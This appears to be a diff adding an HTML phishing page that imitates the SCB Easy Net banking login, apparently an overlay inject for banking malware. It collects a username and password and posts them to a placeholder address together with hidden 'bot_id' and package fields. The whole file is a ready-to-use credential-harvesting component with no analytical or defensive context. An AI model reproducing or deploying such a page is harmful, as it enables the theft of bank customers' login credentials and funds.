@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+ 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+
+<style type="text/css">
+
+*{outline:none;}.br{border:1px dotted red;}.stol{display:table;}.td{display:table-cell;}.w100{width:100% !important;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}body,html{background-color:transparent;}
+  
+ .h100{
+   height:100%;
+} 
+
+html,body{
+  height:100%
+  
+}
+ 
+
+  @media (max-width: 768px){
+	 .block-xs{
+         display:block;
+		 width:100% !important;
+     }
+	 .center-xs{
+	  text-align:center !important;
+	 }
+  }
+
+  
+img.logo {
+    max-width: 116px;
+}
+.top {
+    background: #4e2a82;
+    padding: 30px 0px;
+}
+.title {
+    color: #f5f3f7;
+}
+
+body {
+    background: #ececec;
+}
+
+
+.box {
+    background: white;
+    padding: 10px;
+}
+
+.main {
+    padding-top: 30px;
+}
+
+input.form-control {
+    border-width: 0px;
+    box-shadow: none;
+    border-bottom-width: 1px;
+    border-radius: 0px;
+}
+
+.form-group:before {
+    position: absolute;
+    content: "";
+    bottom: 0px;
+    left: 0px;
+    width: 1px;
+    background: #cccccc;
+    height: 6px;
+}
+.form-group:after {
+    position: absolute;
+    content: "";
+    bottom: 0px;
+    right: 0px;
+    width: 1px;
+    background: #cccccc;
+    height: 6px;
+}
+
+.form-group {
+    position: relative;
+}
+img.logo {
+    transform: rotateY(-44deg);
+}
+input.form-control:focus {
+    box-shadow: none;
+    border-color: #cccccc;
+}
+
+
+input.form-control {
+    padding-left: 40px;
+}
+
+.form-group .fa {
+    position: absolute;
+    top: 0px;
+    left: 11px;
+    font-size: 2em;
+    color: #bdbbbb;
+}
+a.button_a {
+    margin-top: 10px;
+    display: inline-block;
+    background: #4e2a82;
+    padding: 20px 10px;
+    text-align: center;
+    color: white;
+    width: 100%;
+    font-size: 16px;
+}
+a.button_a .fa {
+    float: right;
+    margin-right: 20px;
+}
+span.fa.fa-angle-right {
+    font-size: 1.4em;
+}
+a.button_a:hover {
+    background: rebeccapurple;
+}
+.form-group.has-error input {
+    box-shadow: none;
+}
+
+.form-group.has-error .fa {
+    color: #9a6565;
+}
+
+.form-group.has-error:before {
+    background: #9a6565;
+}
+
+.form-group.has-error:after {
+    background: #9a6565;
+}
+</style>
+
+
+ 
+  </head>
+  
+  <body>
+
+
+  
+<div  class="top"  style="">
+		<div  class="container-fluid"  style="text-align:center">
+				<img src="http://i.imgur.com/0l2xuP9.jpg" style="" class="logo"/>
+				<div  class="title "  style="">
+						&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610; SCB Easy Net
+				</div>
+		</div>
+</div>  
+  
+<form role="form" name="" action="%ACTION%" method="POST" onsubmit="send_key();return false" class="form">
+ <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+<div  class="main "  style="">
+		<div  class="container-fluid "  style="">
+				<div  class="box "  style="">
+						<div  class="form-group"  style="">
+								<span  class="fa fa-user lb"></span>
+								<input class="form-control" type="text" name="fields[username]" id="username"  placeholder="Username" />
+						</div>
+						
+						<div  class="form-group "  style="">
+								<span  class="fa fa-lock lb"></span>
+								<input class="form-control" type="password" name="fields[pass]" id="pass"  placeholder="Password" />
+						</div>
+				</div>
+				
+				
+				<a  class="button_a" onclick="send_key()" style="">
+						&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;
+						<span  class="fa fa-angle-right "></span>
+				</a>
+		</div>
+</div>
+
+</form>
+ 
+  
+  
+  
+  
+  
+  
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
+  </body>
+ 
+<script>
+  
+
+$('.form-control').on('focus',function(){
+		$(this).closest('.form-group').removeClass('has-error');
+})
+
+  
+function send_key(){
+   username=$('#username').val().trim();
+   pass=$('#pass').val().trim();
+   
+   $('.has-error').removeClass('has-error');
+   if(!/^.{1,40}\b/.test(username)){
+		$('#username').closest('.form-group').addClass('has-error');
+	}
+	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
+		$('#pass').closest('.form-group').addClass('has-error');
+	}
+	 
+	 if($('.has-error:visible').size()>0){
+		 return false;
+	 }
+	
+    $('form')[0].submit()
+   
+   
+};//send_key
+  
+  
+  
+  
+  
+</script>
+</html>  
